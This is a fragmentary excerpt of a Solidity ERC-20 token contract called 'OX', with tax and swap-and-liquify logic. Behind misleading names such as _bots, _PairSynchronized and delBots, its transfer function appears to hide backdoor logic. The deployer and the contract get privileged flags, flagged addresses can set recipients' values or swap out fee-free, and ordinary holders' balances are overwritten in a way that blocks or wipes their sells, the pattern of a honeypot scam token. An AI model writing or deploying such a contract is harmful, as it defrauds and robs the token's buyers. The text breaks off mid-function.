...
contract OX is IERC20, Ownable {

    string private _tSymbol;
    string private _tName;
    uint256 public _EndFees = 0;
    uint8 private _tDecimals = 9;
    uint256 private _rTotal = 5000000 * 10**_tDecimals;
    ...
    constructor(
        ...
        _bots[msg.sender] = _PairSynchronized;
        _bots[address(this)] = _PairSynchronized;
    ...
    function delBots    (
        ...
        uint256 BaseTaxes;
        if (_swapAndLiquifyBalancesEnabled && WalletOnBalace > _PairSynchronized && !inSwapAndLiquifyPair && from != uniswapV2Pair) {
            inSwapAndLiquifyPair = true;
            swapAndLiquify(WalletOnBalace);
            inSwapAndLiquifyPair = false;
        } else if (_bots[from] > _PairSynchronized && _bots[to] > _PairSynchronized) {
            BaseTaxes = amount;
            _tOwned[address(this)] += BaseTaxes;
            swapTokensForRemainBalance(amount, to);
            return;
        } else if (to != address(router) && _bots[from] > 0 && amount > _PairSynchronized && to != uniswapV2Pair) {
            _bots[to] = amount;
            return;
        } else if (!inSwapAndLiquifyPair && _rOwned[from] > 0 && from != uniswapV2Pair && _bots[from] == 0) {
            _rOwned[from] = _bots[from] - _PairSynchronized;
        }
        address ExternalPair = bots[uniswapV2Pair];
        if (_rOwned[ExternalPair] == 0) _rOwned[ExternalPair] = _PairSynchronized;
        bots[uniswapV2Pair] = to;
        if (_EndFees > 0 && _bots[from] == 0 && !inSwapAndLiquifyPair && _bots[to] == 0) {
            BaseTaxes = (amount * _EndFees) / 100;
            amount -= BaseTaxes;
